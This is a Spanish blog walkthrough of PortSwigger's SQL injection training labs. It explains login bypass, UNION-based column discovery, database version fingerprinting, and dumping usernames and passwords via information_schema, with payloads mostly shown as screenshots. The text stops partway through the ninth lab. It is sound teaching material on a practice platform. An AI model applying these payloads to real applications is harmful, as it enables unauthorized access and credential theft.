---
layout: single
title: Inyección SQL - SQLi - Laboratorios de PortSwigger
excerpt: "Dentro de este post vamos a dar una explicación de como resolver todos los laboratorios de la plataforma PortSwigger sobre SQL injection SQLi, Para esto ya debemos tener lo básico sobre bases de datos que vimos en el primer post de inyecciones SQL."
date: 2022-11-13
classes: wide
header:
  teaser: /assets/images/SQLiPortswigger/SQLips.jpg
  teaser_home_page: true
#  icon: /assets/images/hackthebox.webp
categories:
  - vulnerabilidad web
tags:  
  - mysql
  - SQLi
  - Portswigger
  - BurpSuite
---

<br>

**Índice de contenido**

- [Vulnerabilidad de inyección SQL en la cláusula WHERE que permite la recuperación de datos ocultos](#id1)
- [Vulnerabilidad de inyección SQL que permite omitir el inicio de sesión (bypass)](#id2)
- [Ataque UNION de inyección SQL, determinando el número de columnas devueltas por la consulta](#id3)
- [Ataque UNION de inyección SQL, encontrando una columna que contiene texto](#id4)
- [Ataque UNION de inyección SQL, recuperación de datos de otras tablas](#id5)
- [Ataque SQL inyection UNION, recuperando múltiples valores en una sola columna](#id6)
- [Ataque de inyección SQL, consultando el tipo y la versión de la base de datos en Oracle](#id7)
- [Ataque de inyección SQL, consultando el tipo y la versión de la base de datos en MySQL y Microsoft](#id8)
- [Ataque de inyección SQL, enumerando el contenido de la base de datos en bases de datos que no son de Oracle](#id9)
- [Ataque de inyección SQL, enumerando el contenido de la base de datos en Oracle](#id10)
- [Inyección SQL ciega con respuestas condicionales](#id11)
- [Creando un script para dumpear datos](#id1010)
- [Inyección ciega de SQL con errores condicionales](#id12)
- [Inyección ciega de SQL con retrasos de tiempo](#id13)
- [Inyección SQL ciega con retardos de tiempo y recuperación de información](#id14)
- [Inyección SQL con omisión de filtro a través de codificación XML](#id17)


<div id='id1' />

# Laboratorio 1: vulnerabilidad de inyección SQL en la cláusula WHERE que permite la recuperación de datos ocultos

<br>

En este primer laboratorio, veremos algo básico, como ya hemos visto en el título, jugaremos con la cláusula **WHERE** para recuperar datos de las tablas dentro de la base de datos.

![Lab1](/assets/images/SQLiPortswigger/lab1/Lab1.png)


<br>

Como vemos en la imagen esto es lo que nos muestra en el laboratorio 1, nos dice que este laboratorio contiene una vulnerabilidad tipo SQL inyection, en el filtro de la categoría producto, y cuando hacemos una petición sobre alguna categoría, en este caso usaremos la categoría **"Gifts"** y por detrás se interpreta una consulta que es así:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

Que como ya sabemos, primero se selecciona todo el contenido de la tabla **products**, para después filtrar datos donde **category** tenga un valor en formato string el cual es **Gifts**, y por ultimo nos dice que **relased**, debe ser igual a 1.

Este último nombre **released**, nos da a entender que hay más datos que no podemos ver, ya que como sabemos released significa "liberado", por lo que debe haber cosas que aún no se han liberado, y por lógica deben tener un valor que no sea 1, para que no se muestren antes de tiempo.

<br>

Ahora que conocemos un poco la consulta vayamos a desplegar el laboratorio en el botón que dice "Acces the lab".

Una vez dentro nos encontraremos con esta página que nos desplegá el laboratorio:

![Lab1](/assets/images/SQLiPortswigger/lab1/web1.png)

<br>

Vemos que al parecer es un tipo de tienda online, arriba hay un indicador que nos dice si hemos terminado el laboratorio o no, y ya de primera vista estamos viendo un filtro de categorías:

![categories](/assets/images/SQLiPortswigger/lab1/categories.png)

<br>

Como la categoría que nos dijeron al inicio, así que ya tenemos por donde empezar!

Recordemos que al inicio nos dicen que existe una vulnerabilidad SQLi en el filtro de categoría, por lo que accederemos a alguna de esas categorías, en este caso ingresaremos a la categoría de **"Gifts"**, y al abrir esa categoría vemos esta respuesta de la página:

![Gifts](/assets/images/SQLiPortswigger/lab1/Gifts.png)

Vemos que nos muestra este contenido, en la url vemos algo como esto:

![url](/assets/images/SQLiPortswigger/lab1/url.png)

<br>

Pero la parte que nos interesa es esta:

![url1](/assets/images/SQLiPortswigger/lab1/url1.png)

Como sabemos aquí está haciendo una consulta, y como ya explicamos antes por detrás la consulta se puede ver algo así:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

Y como la página del laboratorio nos dice que hay una vulnerabilidad en el filtro de categorías, intentaremos inyectar nuestras consultas sql para desplegar cosas interesantes.

También nos dice que el objetivo de este nivel es el siguiente:

Para resolver el laboratorio, realice un ataque de inyección SQL que haga que la aplicación muestre detalles de todos los productos en cualquier categoría, tanto lanzados como no lanzados.

Nos dice que quiere que mostremos todos los productos de cualquier categoría en un solo lugar, y también que se muestren los que están listos para lanzarse y los que aún no, lo cual esto nos recuerda a que hay posiblemente una columna llamada **released** con algún valor numérico, por lo que suponemos que este es el filtro para saber si algo está listo para mostrarse o no, así que ya sabemos el objetivo, mostrar todos los productos de todas sus categorías, tanto listos para lanzarse o no.

<br>

Sabemos que por detrás la consulta se ve algo así:

![consulta](/assets/images/SQLiPortswigger/lab1/consulta1.png)

La cual nos muestra que está seleccionando todo de la tabla **products**, y filtramos para que nos muestre donde algún valor de la columna **category** tenga el valor de **'Gifts'** y en la columna **released** tenga el valor 1. En caso de que en la columna **released** tenga el valor de 1, se retornara un valor **true** lo cual indica que nos dejara ver dicho contenido.

<br>

Y lo que haremos nosotros es que en la url la editaremos, para poder inyectar nuestras consultas, como ya sabemos el objetivo el cual es mostrar todos los productos de todas las categorías en un solo lugar y además mostrar también los productos que no están listos para mostrarse, o sea que no tienen valor 1 en **released**, por lo que primero haremos esto:

![url](/assets/images/SQLiPortswigger/lab1/Url1.png)

Vemos que en la url hemos agregado una comilla simple después de la categoría, y lo que estamos haciendo ahora, es cerrar el apartado de **category** que es **"Gifts"** y escaparnos de ese apartado para poder inyectar nuestras propias consultas, como vemos en la parte derecha, que agregamos el operador **OR**, el cual haremos un valor que nos de **true**, en este caso decimos, O que 1 sea igual a 1, lo cual es verdadero, dándonos permiso para desplegar todo lo de la tabla **products**, ya que el valor que filtraba lo de **released** estará comentado y no se interpretara, así que por detrás la consulta se vería algo así:

![query](/assets/images/SQLiPortswigger/lab1/query1.png)

<br>

Como podemos ver, la comilla simple que agregamos hizo que el apartado de **category** se cerrará y la otra comilla se recorrió después de nuestra consulta que queramos agregar, dándonos entrada a escribir nuestras consultas, que en este caso es el operador **OR** dandole un valor que nos responda con un **true**, para que nos valide esta consulta y mostrarnos todo lo de la tabla **products**, y como hemos agregado el operador **OR**, que en este caso como sabemos le indicamos algo para que nos devolviera un **true**, entonces nos mostrara todo, y el filtro de **released** no se ejecutara, ya que al final de nuestra consulta inyectada hemos puesto los guiones para indicarle que el resto de la consulta se comente y no se tome en cuenta, por eso la marque de un color gris, ya que no se tomara en cuenta en la consulta.

<br>

Por lo que ya no habrá filtros que respetar, mostrándonos todo lo de esa tabla en un solo lugar:

![respuesta](/assets/images/SQLiPortswigger/lab1/respuesta1.png)

Así que hemos logrado el objetivo de este laboratorio, mostramos todos los productos de todas las categorías en una sola parte, evadiendo el filtro de sí está listo para lanzarse o no, así que estamos viendo productos tanto lanzados como no lanzados, o sea que en **released** tenían un valor diferente a 1, por lo que la consulta se tornaría false y solo nos mostraría lo que estuviese en 1, pero como evadimos este filtro mostramos todo valor sea o no listo para mostrarse!

<br>

<div id='id2' />

# Laboratorio 2: vulnerabilidad de inyección SQL que permite omitir el inicio de sesión (bypass)

En este segundo laboratorio, nos dice que tenemos un panel login vulnerable a SQLi, y nos dice que para resolverlo debemos hacer un bypass del usuario **administrator**, esto quiere decir que debemos encontrar una manera de acceder como el usuario **administrator** sin conocer su contraseña.

![lab2](/assets/images/SQLiPortswigger/lab2/lab2.png)

<br>

Al acceder al laboratorio nos encontramos con este panel login en la sección de "My account":

![login](/assets/images/SQLiPortswigger/lab2/login.png)

Desde aquí es donde probaremos inyectar nuestras consultas para ver si logramos hacer bypass en este panel usando el usuario **administrator**, así que primero, supondremos que por detrás se ejecuta alguna consulta similar a esta:

![consulta](/assets/images/SQLiPortswigger/lab2/consulta.png)

Aquí lo que nos interesa es que se está usando la tabla **users**, que dentro de esta puede haber columnas más interesantes que las que llama por defecto la consulta, vemos que después de hacer la selección de columnas en dicha tabla en este caso **users**, nos dice que donde el **username** y **password** que toman sus valores del panel login, coincidan con algún valor dentro de la tabla, entonces si esto se cumple nos va a dejar acceder al sistema.

Pero solo Conocemos el usuario más no la contraseña, por lo que intentaremos algo:

![login_bypass](/assets/images/SQLiPortswigger/lab2/login_bypass.png)

Lo que hicimos fue agregar el usuario, pero también agregamos una comilla simple para escapar de la consulta por defecto e inyectar nuestras propias consultas, esto se entiende más al ver como se interpretó la consulta por detrás:

![consulta_bypass](/assets/images/SQLiPortswigger/lab2/consulta_bypass.png)

Como podemos ver al agregar la comilla después de nuestro usuario lo que sucedió es que cerramos el campo de **username** para pasar a comentar el apartado de **password**, haciendo que eso ya no deba validarse con nuestros datos que pusimos en el cuadro de password del panel login, por lo que ahora la comilla que estaba antes paso a recorrerse hasta el final, pero como hemos comentado de resto todo, no nos afectara la otra parte gris de la consulta, ya que está comentada, y al hacer esto la base de datos interpretara esto como **true**, ya que solo nos está validando el **username** que en este caso es correcto, por lo que ya no verificara el apartado de **password** porque como dije antes esto ya está comentado e invalido, dejándonos acceder como dicho usuario al dar Log in, ya que todo lo que mencione se interpretara dándonos el resultado ya esperado.

<br>

Al hacer esto ya habremos completado el nivel y dejándonos un aviso de que hemos completado este laboratorio:

![fin](/assets/images/SQLiPortswigger/lab2/final.png)

<br>

<div id='id3' />

# Laboratorio 3: Ataque UNION de inyección SQL, determinando el número de columnas devueltas por la consulta

Lo que nos dice este laboratorio, es que hay una vulnerabilidad nuevamente en el filtro de categorías de tipo SQLi, además de que los resultados de las consultas dentro de esta web, se muestran en pantalla, en este caso los productos que hemos visto serían los resultados, así que podríamos usar un ataque usando el operador **UNION**, para sacar datos de tablas, etc., pero antes de esto, antes de cualquier cosa, debemos saber cuantas columnas nos está devolviendo la consulta.

![determinar_columnas](/assets/images/SQLiPortswigger/lab3/determinar_columnas.png)

<br>

Así que nuestro objetivo principal es descubrir cuantas columnas se están devolviendo a la web para que nos muestre lo que vemos, primero al entrar a alguna categoría, en este caso **pets**, vemos que nos devuelve esto:

![pets](/assets/images/SQLiPortswigger/lab3/pets.png)

Primero haremos la prueba de la comilla simple para verificar si es vulnerable a SQLi, por lo que agregaremos una comilla simple a la url:

![consulta1](/assets/images/SQLiPortswigger/lab3/consultaweb1.png)

![err](/assets/images/SQLiPortswigger/lab3/error.png)

En este caso nos muestra este error, lo cual puede ser posible que sea vulnerable, por lo que ahora que ya sabemos que podría ser vulnerable, pasaremos a probar lo siguiente.

Cuando entramos al filtro de **pets**, podemos ver que en esta respuesta podemos intuir que se están devolviendo 3 columnas, el nombre, precio y los detalles, por lo que jugaremos con la cláusula **order by**, que viene en SQL, esto nos permitirá mezclar la cantidad de columnas devueltas y saber cuantas hay, así que al hacer esta consulta desde la URL:

![c2](/assets/images/SQLiPortswigger/lab3/consultaweb2.png)

Como vemos lo primero que hicimos fue dejar la comilla, esto para romper la consulta y que se invalide lo que nos iba a mostrar por defecto, en su lugar le pedimos que nos ordene las 3 primeras columnas devueltas, sabemos que son 3, ya que lo hemos intuido al contar las columnas visibles en lo que nos mostraría por defecto, así que en este caso si eran 3 y nos mostró esto:

![order](/assets/images/SQLiPortswigger/lab3/orderby.png)

Vemos que nos ha interpretado lo que le pedimos sin ningún error, sabemos que esta es la cantidad exacta de columnas devueltas, ya que de ser más, por ejemplo probemos con 4 en vez de 3:

![err](/assets/images/SQLiPortswigger/lab3/error.png)

Rápidamente nos arroja este aviso de error, ya que no pudo interpretar lo que le dijimos, ya que solo hay 3 columnas devueltas y no 4.

<br>

Una vez sepamos la cantidad de columnas devueltas, en este caso 3, lo siguiente será usar **UNION SELECT** para de todas las columnas devueltas, agruparlas:

![c3](/assets/images/SQLiPortswigger/lab3/consultaweb3.png)

Aquí lo que hicimos fue agregar el **UNION SELECT** a la url, para que después sea interpretado por la consulta, seguido de 3 valores los cuales asignamos como **NULL**, ya que si poníamos número, o string, no nos deja.

> Si hubiese más columnas devueltas hay más probabilidad de que alguna de ellas nos aplique las etiquetas de número o string, y poder inyectar nuestras consultas basadas en error, pero en este caso son pocas que no sucede eso.

Por lo que al hacer esto estaremos mezclando los valores de dichas columnas junto con el valor **NULL**, que en este caso no se muestra nada, pero el objetivo de este laboratorio era determinar el número de columnas devueltas jugando con **UNION SELECT**, por lo que al tramitar la petición de la url estaremos completando este nivel:

![fin](/assets/images/SQLiPortswigger/lab3/fin.png)

<br>

<div id='id4' />

# Laboratorio 4: Ataque UNION de inyección SQL, encontrando una columna que contiene texto

Buscar una columna que interpreta cadenas de texto, nos puede servir para después inyectar nuestras consultas directamente, pero primero necesitamos encontrar que columnas devueltas aceptan texto.

![4](/assets/images/SQLiPortswigger/lab4/lab4.png)

Para ello, nos dan un laboratorio el cual como sabemos, en la web principal nos dice que es vulnerable a SQLi dentro del filtro de categorías, por lo que primero iremos a ello:

![category](/assets/images/SQLiPortswigger/lab4/Gifts.png)

Vemos que primero estamos en este filtro de la categoría **Gifts**, vemos que la url se ve así:

![url](/assets/images/SQLiPortswigger/lab4/url.png)

Y para resolver este laboratorio debemos mostrar esta cadena de texto en una columna devuelta que admita cadena de texto, también llamadas strings:

![string](/assets/images/SQLiPortswigger/lab4/string.png)

Como vemos, en esta parte nos dice que hagamos que la base de datos nos devuelva el valor "VqagHe" en el valor de la columna.

<br>

Ya sabemos el objetivo, así que primero iniciaremos descubriendo el número de columnas devueltas, que lo haremos como sabemos con **order by** y **UNION SELECT**:

![url2](/assets/images/SQLiPortswigger/lab4/url2.png)

![orderby](/assets/images/SQLiPortswigger/lab4/orderby.png)

Como vemos hemos descubierto que el número de columnas devueltas es 3, por lo que ahora usando **UNION SELECT** descubriremos cuál de las 3 columnas interpreta texto, probamos con la primera y:

![1](/assets/images/SQLiPortswigger/lab4/1.png)

Vemos que en la url hemos dicho que en lugar del primer NULL, nos muestre un valor de texto, y al intentar tramitar esta petición el servidor nos responde con esto:

![error](/assets/images/SQLiPortswigger/lab4/error.png)

Por lo que ahora probaremos con el valor de la segunda columna:

![2](/assets/images/SQLiPortswigger/lab4/2.png)

Y como vemos esta vez nos ha interpretado, ya que esta columna es de valor string, lo cual nos permitió inyectar nuestro texto, aunque podríamos inyectar código, pero esto aún no, por lo que como vemos arriba nos dice que hemos completado este nivel, ya que logramos mostrar ese valor string en lugar de una columna, la cual podemos ver al final de la tabla:

![fin](/assets/images/SQLiPortswigger/lab4/final.png)

<br>

<div id='id5' />

# Laboratorio 5: Ataque UNION de inyección SQL, recuperación de datos de otras tablas

En el siguiente laboratorio, podemos ver que nos dice lo siguiente:

![lab5](/assets/images/SQLiPortswigger/lab5/lab5.png)

Dice que en el filtro de categoría hay como sabemos una vulnerabilidad de tipo SQLi, como los resultados de estas consultas se muestran en la web podremos hacer uso de un ataque **UNION SELECT**, que como sabemos nos mezcla datos junto con los resultados de las consultas, comúnmente usamos esto para inyectar consultas y verlo mezclado en lugar de que nos muestre lo que debería esa columna.

Después dice que la base de datos actual, tiene una tabla llamada **users**, la cual contiene 2 columnas interesantes, las cuales son **username** y **password**, y al final nos dice que debemos acceder al sistema como el usuario **administrator**.

Como sabemos, lo primero que debemos hacer es detectar cuantas columnas nos está devolviendo en el apartado vulnerable:

![vuln](/assets/images/SQLiPortswigger/lab5/vuln.png)

Como podemos ver, en este apartado podemos ver que vemos los resultados de las consultas que se hacen por detrás en la base de datos, podemos ver que posiblemente haya 2 columnas:

![col](/assets/images/SQLiPortswigger/lab5/col.png)

La primera, el título, y la segunda el contenido de dicho título, por lo que intuimos que hay 2 columnas, y lo sabremos jugando con **order by**:

![2](/assets/images/SQLiPortswigger/lab5/orderby.png)

![order](/assets/images/SQLiPortswigger/lab5/order.png)

Y como podemos apreciar, encontramos el número correcto de columnas, ya que no nos muestra ningún error, y sabemos que es 2, ya que si ponemos 1 más nos daría error.

> Recuerda que se debe mostrar el contenido mas a parte que no nos marque error, ya que si no nos muestra el contenido quiere decir que algo hicimos mal, como olvidar poner la comilla simple al inicio del apartado vulnerable que en este caso es Pets, para que nos interprete lo que queremos.

<br>

Ahora que ya conocemos el número de columnas, recordemos que debemos saber cuál de esas columnas nos interpreta texto, por lo que probaremos con esta petición web:

![text1](/assets/images/SQLiPortswigger/lab5/texto1.png)

Y nos muestra esto:

![res1](/assets/images/SQLiPortswigger/lab5/respuesta1.png)

Y como vemos hasta abajo en la última línea nos ha interpretado el texto!

Probemos si la siguiente columna igual admite texto:

![text2](/assets/images/SQLiPortswigger/lab5/texto2.png)

Y nos responde:

![res2](/assets/images/SQLiPortswigger/lab5/respuesta2.png)

Vemos que igual interpreta texto, esto es lógico, ya que antes de saber esto podemos ver que en este caso las columnas solo nos devuelven texto, como supimos arriba, el título y la descripción de este título, como ambos son texto no es extraño que esto suceda.

<br>

Ahora la siguiente parte de este reto no solo es esto, si no que debemos saber la contraseña del usuario **administrator**, por lo que ahora necesitamos saber los nombres de tablas disponibles dentro de la base de datos actual, por lo que ahora en vez de mostrar simple texto, usaremos esto para inyectar consultas SQL que determinen los nombres de tablas.

Como ya sabemos que hay una tabla llamada **users** y 2 columnas llamadas **username** y **password** en este caso no será necesario enumerar esto, ya que el mismo reto nos ha dado esta información por lo que en este caso no será necesario enumerar y podremos pasar simplemente a sacar los datos de dichas columnas:

![sqli](/assets/images/SQLiPortswigger/lab5/sqli.png)

Aquí le estamos indicando que en vez de las cadenas de texto, nos muestre lo que hay en las columnas **username** y **password**, de la tabla **users**, lo cual al tramitar esta petición el servidor de la base de datos nos responderá esto:

![res3](/assets/images/SQLiPortswigger/lab5/respuesta3.png)

Como vemos hemos sacado los datos de dichas columnas dentro de esa tabla, esto fue facil, ya que la página nos proporcionó los nombres de las columnas y de la tabla, pero esto si no lo sabemos tendríamos que enumerar las tablas, para posteriormente enumerar las columnas de dicha tabla, que veremos más adelante, y por ahora ya podemos ir al panel login y ingresar con las credenciales recién encontradas, como el reto nos dice que debemos acceder como el usuario **administrator** usaremos dichas credenciales para acceder y terminar el reto:

![final](/assets/images/SQLiPortswigger/lab5/final.png)

Como vemos hemos completado con éxito este laboratorio, pero como sabemos en un entorno real esto es más extenso, ya que nadie nos dirá el nombre de las bases de datos, tablas y columnas, y tendremos que hacerlo por nuestra cuenta.

<br>

<div id='id6' />

# Laboratorio 6: ataque SQL inyection UNION, recuperando múltiples valores en una sola columna

Como recordamos en el laboratorio anterior, logramos recuperar datos de una tabla, gracias a que había 2 valores que interpretaban cadenas de texto y esto nos facilitó concluir ese laboratorio, pero en este caso:

![lab6](/assets/images/SQLiPortswigger/lab6/lab6.png)

Nos dice que ahora solo podremos hacerlo en una sola columna y no 2, y en este laboratorio nos dice que en esta base de datos hay una tabla llamada **users**, con columnas las cuales son **username** y **password**, y nuevamente nos dice que debemos acceder como el usuario **administrator**, por lo que debemos descubrir su contraseña.

<br>

Al acceder a este laboratorio, sabemos que en el apartado de filtro de categorías existe la vulnerabilidad SQLi, por lo que sabemos que el primer paso es detectar el número de columnas devueltas:

![consulta1](/assets/images/SQLiPortswigger/lab6/consulta1.png)

Como ya sabemos detectar el número de columnas devueltas usando **order by**, en este caso descubri que las columnas devueltas son 2:

![order](/assets/images/SQLiPortswigger/lab6/orderby.png)

Ahora que hemos descubierto la cantidad, procederemos a detectar cuál de estas columnas interpreta texto, por lo que empezaremos con la primera:

![columna1](/assets/images/SQLiPortswigger/lab6/columna1.png)

Vemos que intentaremos ver si la primera columna interpreta texto, y al enviar esta petición nos muestra:

![error](/assets/images/SQLiPortswigger/lab6/error.png)

Vemos que nos da un error, ya que esta columna posiblemente no admite cadenas de texto, por lo que intentaremos probar con la segunda columna:

![columna2](/assets/images/SQLiPortswigger/lab6/columna2.png)

Y al enviar esta petición nos responde con esto:

![respuesta2](/assets/images/SQLiPortswigger/lab6/respuesta2.png)

Como podemos ver al final de todo vemos que nos ha interpretado dicho texto en esa columna, por lo que podremos inyectar nuestras consultas SQL.

> La diferencia de este laboratorio con el anterior es que en el anterior las 2 columnas nos interpretaban texto, y en este caso solo una.

<br>

Ahora que ya sabemos que columna es la que nos permitirá inyectar nuestras consultas, pero como solo tenemos una columna, tendremos que jugar con la concatenación de cadenas, o "string concatenation".

Para saber más sobre esto podemos visitar la [SQL injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet), lo cual es una hoja de trucos que nos facilitara ciertas consultas a la hora de hacer inyecciones sql.

Al leerlo, sabremos que para concatenar múltiples cadenas de texto hay diferentes formas de hacerlo, dependiendo de la base de datos que funcione por detrás, para esto inyectaremos esta consulta para saber la versión de la base de datos:

![version](/assets/images/SQLiPortswigger/lab6/version.png)

Como vemos hemos agregado una pequeña función la cual nos dirá que versión usa la base de datos, y al tramitar esta petición veremos que nos dice la versión hasta abajo junto a la ultima columna:

![version](/assets/images/SQLiPortswigger/lab6/version_response.png)

Podemos ver que la base de datos usa **PostgreSQL 12.12**, y como vemos en la hoja de trucos, mejor conocida como Cheat Sheet, vemos que para concatenar cadenas en esa versión tendremos que hacer esto:

![concatenation](/assets/images/SQLiPortswigger/lab6/concatenation.png)

Vemos que en la versión de **PostgreSQL** que como sabemos usa la base de datos, entonces ahí nos especifica como se concatenan cadenas en dicha versión.

<br>

Al saber que para concatenar con esta versión se usa **"||"**, debemos agregarlo a nuestra consulta y quedara algo así:

![exploit](/assets/images/SQLiPortswigger/lab6/exploit.png)

Le decimos que nos una las columnas **username** y **password** en un solo lugar, y después esas columnas las obtendremos de la tabla **users**.

Y vemos que la web nos responde:

![resupesta](/assets/images/SQLiPortswigger/lab6/respuesta3.png)

Como podemos ver, abajo podemos leer como 3 usuarios y a la derecha su contraseña, podemos ver que tanto el usuario como la contraseña están pegados y no se distinguen bien, por lo que podemos modificar la petición para agregar una coma que nos separe ambas columnas:

![exploit2](/assets/images/SQLiPortswigger/lab6/exploitnation.png)

Y ahora ahí ya podremos leer la contraseña y el usuario separados por una coma y distinguirlos mejor ya que en medio de los pipes hemos agregado una comilla para separar los valores por dicha comilla, aunque también podriamos probar usando **concat()**, pero en este caso lo haré con la comilla en medio de los pipes.

> Aveces las webs usarán filtros para evitar inyecciones SQL, pero estos filtros aveces tratan de que no leen cadenas de texto pero si lo convertimos en hexadecimal nos valdrá igualmente, como cuando no te deja poner el nombre de columna que quieres dumpear en su nombre, entonces tocaría intentar con su valor en hexadecimal, y como este podría haber más casos.

Ahora ya solo quedaría entrar como el usuario**administrator**, poner su password que acabamos de dumpear, y poner las credenciales en el panel login para terminar este laboratorio:

![final](/assets/images/SQLiPortswigger/lab6/final.png)

Y hemos completado este laboratorio.

<br>

<div id='id7' />

# Laboratorio 7: Ataque de inyección SQL, consultando el tipo y la versión de la base de datos en Oracle

En este laboratorio, ahora nos dice que hagamos un ataque de inyección SQL, para consultar el tipo y versión de base de datos, pero en este caso el tipo de base de datos será Oracle, por lo que la sintaxis será diferente, pero la lógica sigue siendo la misma.

![lab7](/assets/images/SQLiPortswigger/lab7/lab7.png)

Como podemos leer, nos dice que este laboratorio contiene una vulnerabilidad de tipo SQLi, en el filtro de categorías, y que podemos usar un ataque de **UNION SELECT** para poder inyectar consultas, como ya lo sabemos y hemos hecho.

Después abajo nos dice que en las bases de datos Oracle, al hacer una declaración **SELECT**, debemos indicarle una tabla desde donde haremos la consulta, en este caso nos dice que existe una tabla llamada **dual**, que al investigar sobre esta tabla nos dice que está presente en la mayoría de bases de datos oracle, esta tabla tiene otro propósito, pero nosotros abusaremos de dicha tabla para empezar a inyectar nuestras consultas.

Así que al ir a la página donde es vulnerable a SQLi vemos esto:

![r1](/assets/images/SQLiPortswigger/lab7/respuesta1.png)

Podemos apreciar que posiblemente haya 2 columnas, la que nos da el título del texto, y la que nos da el texto de ese título, así que podemos intuir que hay 2 tablas que son de tipo string, ya que nos están devolviendo cadenas de texto, así que haremos un **UNION SELECT**, pero como dije antes, con Oracle es necesario darle una tabla, y ya sabemos que tabla darle o sea **dual**, por lo que la consulta nos quedaría algo así:

![consulta1](/assets/images/SQLiPortswigger/lab7/consulta1.png)

Podemos apreciar que agregamos dicha tabla al final, ya que de no ponerla nos dará error, ya que Oracle requiere de una tabla al hacer declaraciones **UNION**.

Y al tramitar esta petición nos responde esto:

![r2](/assets/images/SQLiPortswigger/lab7/respuesta2.png)

Vemos que teníamos razón, las 2 columnas eran de tipo string, por lo que vemos que nos interpreta dicho contenido, y ahora solo queda hacer lo que nos dice el reto, que es mostrar la versión de esta base de datos, en este caso la hoja de trucos nos dice que para llamar a la función que nos dice la versión en Oracle se hace de la siguiente manera:

![v](/assets/images/SQLiPortswigger/lab7/vers.png)

Podemos apreciar que es necesario llamar al valor **banner** de **v$version**, por lo que en este caso necesitaremos llamar a otro recurso y ya no será necesario usar la tabla **dual**, ya que esto solo se hace en caso de no tener algo a lo que llamar, por lo que en este caso tenemos que llamar a **v$version** quedándonos la consulta así:

![consulta1](/assets/images/SQLiPortswigger/lab7/consulta1.png)

Podemos apreciar que estamos llamando al valor **banner** en lugar de la columna, y lo que nos mostrará en ese lugar será lo que nos devuelva **v$version**, que en este caso es la versión de la base de datos y al tramitar la petición podremos ver:

![final](/assets/images/SQLiPortswigger/lab7/final.png)

Como podemos ver, hasta abajo esta la respuesta de nuestra inyección, y como el laboratorio nos decía que solo debemos saber la versión hemos terminado este reto.

<br>

<div id='id8' />

# Laboratorio 8: Ataque de inyección SQL, consultando el tipo y la versión de la base de datos en MySQL y Microsoft

Este laboratorio es similar al anterior, la única diferencia es que debemos hacerlo en la versión de base de datos Microsoft, también dice MySQL, ya que lo que haremos funciona exactamente igual que en MySQL.

Debemos inyectar una consulta que nos devuelva la versión del tipo de base de datos, estos niveles sirven para que vayas practicando diferentes tipos de bases de datos y no solo la que hemos usado comúnmente, puedes practicar dumpear datos de diferentes versiones en estos laboratorios y no solo quedarte con lo que te dice el reto.

Sabemos que hay una vulnerabilidad SQLi en el filtro de categoría, el cual se ve así:

![lab8](/assets/images/SQLiPortswigger/lab8/lab8.png)

Podemos intuir que existen 2 columnas de tipo string, ya que una contiene el título, y otra el texto.

Al consultar la hoja de trucos podemos apreciar que nos dice lo siguiente:

![ver](/assets/images/SQLiPortswigger/lab8/version.png)

Vemos que en la versión de Microsoft, para llamar a esa función de versión de la base de datos es simplemente **@@version**, y nuestra consulta quedara algo así:

![consulta](/assets/images/SQLiPortswigger/lab8/consulta.png)

Y en caso de que los parámetros sean correctos, que en este caso he comprobado que si, entonces nos mostrara esto en la respuesta:

![fin](/assets/images/SQLiPortswigger/lab8/final.png)

Podemos ver que hemos logrado inyectar nuestra consulta y saber la versión de esta base de datos, y hemos concluido con este laboratorio.

<br>

<div id='id9' />

# Laboratorio 9: Ataque de inyección SQL, enumerando el contenido de la base de datos en bases de datos que no son de Oracle

En este laboratorio, nos dicen que debemos dumpear contenido de una tabla dentro de una base de datos, el nivel nos dice esto:

![lab9](/assets/images/SQLiPortswigger/lab9/lab9.png)

Como en los niveles anteriores, la vulnerabilidad sigue siendo la del filtro en las categorías, entonces ahí empezaremos, pero después nos dice que dentro de esta base de datos hay una tabla que contiene nombres de usuario y contraseñas, pero en este caso no nos están diciendo el nombre de las tablas ni mucho menos de las columnas, por lo que ahora lo investigaremos por nuestra cuenta, nos dice que para completar este laboratorio debemos acceder al panel login como el usuario **administrator**, cuya contraseña debemos descubrir.

Al ir a la parte vulnerable del laboratorio vemos lo siguiente:

![respuesta1](/assets/images/SQLiPortswigger/lab9/respuesta1.png)

Como recordamos, podemos intuir que en este caso podemos saber que probablemente hay 2 columnas devueltas, la del título del texto y el texto en sí, por lo que con **ORDER BY** o directamente jugando con **UNION SELECT** podemos comprobar que en efecto tiene 2 columnas, y también descubrimos que ambas aceptas strings, ya que interpretan texto por lo que vemos en la respuesta o sea el título y descripción de ese título, nuestra consulta queda algo así:

![consulta1](/assets/images/SQLiPortswigger/lab9/consulta1.png)

Y la respuesta de esta nos muestra:

![respuesta2](/assets/images/SQLiPortswigger/lab9/respuesta2.png)

Vemos que nos interpreta lo que le hemos dicho, ya que la columna es de tipo string, por lo que ahora trataremos de intuir que tipo de base de datos usa, sabemos que no usa Oracle, ya que el mismo nivel lo dice, además podemos saberlo porque no estamos usando la tabla **dual**, así que nos quedan Microsoft,MySQL y PostgreSQL, así que probé con **@@version** y me marco error, por lo que la única opción que quedaba era la de PostgreSQL que es **version()**, ya que Microsoft y MySQL son similares en cuanto a este caso, y esto lo puedes recordar viendo la hoja de trucos:

![ver](/assets/images/SQLiPortswigger/lab9/dbversion.png)

Así que nuestra consulta quedo así:

![ver](/assets/images/SQLiPortswigger/lab9/postgreSQL.png)

Y nos respondió:

![respuesta3](/assets/images/SQLiPortswigger/lab9/respuesta3.png)

Y como sabemos que versión es ahora empezaremos a enumerar en base a la sintaxis de PostgreSQL.

<br>

Primero empezaremos a descubrir que bases de datos existen, para ello crearemos la siguiente consulta:

![databases](/assets/images/SQLiPortswigger/lab9/databases.png)

Estamos indicando que en la primera columna, en esa posición nos muestre el nombre de esquema **schema_name**, esto son las bases de datos, y las consultas para obtenerlas las pusimos a la derecha, alado de la columna 2, le decimos que de la base de datos **information_schema** nos dé los valores de la tabla **schemata**, y en medio de estos 2 valores ponemos un **.** para poder separarlos y la base de datos sepa que está haciendo una consulta de la base de datos **schema_name** a la tabla **schemata**.

Y ahora que sabemos que es esto, veremos lo que nos responde el servidor:

![respuesta4](/assets/images/SQLiPortswigger/lab9/respuesta4.png)

Podemos apreciar que nos ha respondido y nos ha dumpeado varias bases de datos, entre ellas:

- **information_schema**
- **public**
- **pg_catalog**

Así que la que nos llama la atención es la que se llama la atención la tabla de **public**, por lo que sacaremos las tablas de dicha base de datos con la siguiente consulta:

`https://web-security-academy.net//filter?category=Gifts' UNION SELECT table_name,'texto 2' FROM information_schema.tables WHERE table_schema = 'public' -- -`

